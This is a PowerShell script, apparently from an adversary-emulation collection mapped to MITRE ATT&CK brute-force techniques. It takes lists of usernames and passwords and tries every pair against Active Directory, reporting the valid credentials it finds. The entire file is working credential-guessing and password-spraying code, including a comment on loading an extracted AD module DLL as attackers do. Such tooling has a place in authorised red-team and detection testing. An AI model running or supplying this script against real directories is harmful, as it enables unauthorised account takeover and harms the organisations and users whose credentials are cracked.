
<#
T1110.001 - Brute Force: Password Guessing
T1110.003 - Brute Force: Password Spraying
T1110.004 - Brute Force: Credential Stuffing

.Synopsis
    This script attempts to find valid credentials for a set of users by trying different passwords
.DESCRIPTION
    This script takes two files as input, one with usernames and one with passwords. It then attempts 
    to authenticate each of the users with each of the passwords, and prints out any valid credentials
    that it finds.
.EXAMPLE
    .\Bruteforce.ps1 -passfile .\passwords.txt -userfile .\users.txt -waitTime 1
.PARAMETER passwordsFile
    Path to the file containing the passwords
.PARAMETER usersFile
    Path to the file containing the usernames
.PARAMETER waitTime
    The amount of time (in seconds) to wait after each authentication attempt
#>


[CmdletBinding()]
param(
    [Parameter(Mandatory=$true)]
    [string]$passfile,

    [Parameter(Mandatory=$true)]
    [string]$userfile,

    [Parameter(Mandatory=$false)]
    [int]$waitTime = 0
)


# We import the ActiveDirectory module without the need to install it on the current computer, the dll has been extracted from a Windows 10 x64 with RSAT installed
# technique used by real attackers
Import-Module .\Microsoft.ActiveDirectory.Management.dll

# Try to open the files and check for errors
try {
    $passwords = Get-Content $passfile
    $users = Get-Content $userfile
} catch {
    Write-Error "Error opening files. Please check if the paths are correct!"
}

# If both files were opened without errors, start the bruteforce attempt
if ($passwords -and $users) {
    foreach ($user in $users) {
        foreach ($password in $passwords) {
        # Try to authenticate the user with the current password
            Write-Host "Trying $password with $user"
            $result = $null
            try{
                $result = Get-ADUser -Identity $user -Credential (New-Object System.Management.Automation.PSCredential -ArgumentList $user, (ConvertTo-SecureString -String "$password" -AsPlainText -Force)) -ErrorAction SilentlyContinue
                Write-Host $result
                if ($result) {
                    Write-Host "Found valid credentials for user $user : $password"
                }
            }
            catch{
                  Write-Host "An error was encountered: $_"
            }
            Start-Sleep -Seconds $waitTime
        }
    }
}
